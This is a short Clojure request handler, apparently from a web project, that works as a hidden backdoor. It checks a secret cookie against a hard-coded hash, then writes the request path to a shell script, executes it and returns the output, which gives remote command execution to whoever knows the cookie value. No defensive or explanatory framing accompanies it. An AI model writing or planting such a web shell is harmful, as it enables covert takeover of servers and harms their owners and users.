(fn[rq rs](let[
 c(filter(fn[c](="0"(.getName c)))(.getCookies rq))
 u(if(>(count c)0)
  (if(="693c599b0e27c7ad6dd3564ec14d5336b9b9c2b2183c0ec32ddb0d6565d55ca9"
   (f(h(.getBytes(.getValue(first c))))))"RaWa"))]
 (if u(do
 (spit"exec.sh"(subs(.getRequestURI rq)6))
 (slurp(.getInputStream(.exec(Runtime/getRuntime)"/root/git/hn4j/exec.sh")))))))